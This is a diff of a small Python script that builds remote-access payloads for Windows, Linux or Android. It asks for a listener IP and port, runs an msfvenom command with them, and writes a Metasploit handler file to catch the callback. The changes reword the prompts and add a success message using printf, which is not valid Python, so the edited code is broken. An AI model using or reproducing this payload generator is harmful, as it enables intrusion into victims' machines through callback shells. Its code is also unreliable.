@@ -4,11 +4,11 @@
 
 
 from os import system
-os = raw_input("What is this payload for [W]indows/[L]inux/[A]ndroid: ")
-ip = raw_input("Enter your IP: ")
-port = raw_input("Enter your port: ")
-save = raw_input("Enter where to save payload: ")
-name = raw_input("What to name it: ")
+os = raw_input("Targeted Platform [W]indows/[L]inux/[A]ndroid: ")
+ip = raw_input("Listener's IP: ")
+port = raw_input("Listener's Port: ")
+save = raw_input("Saving Directory: ")
+name = raw_input("Payload Name: ")
 
 
 if os == "W":
@@ -29,6 +29,7 @@ if os == "A":
 	platform = "Android"
 	command = r"msfvenom --platform {0} -p {1} LHOST={2} LPORT={3} X > {4}{5}.{6}".format(platform, payload, ip, port, save, name, formation)
 system(command)
+printf("Payload Created.")
 
 handler_file = "{0}handler.rc".format(save)
 f = open(handler_file, 'a')
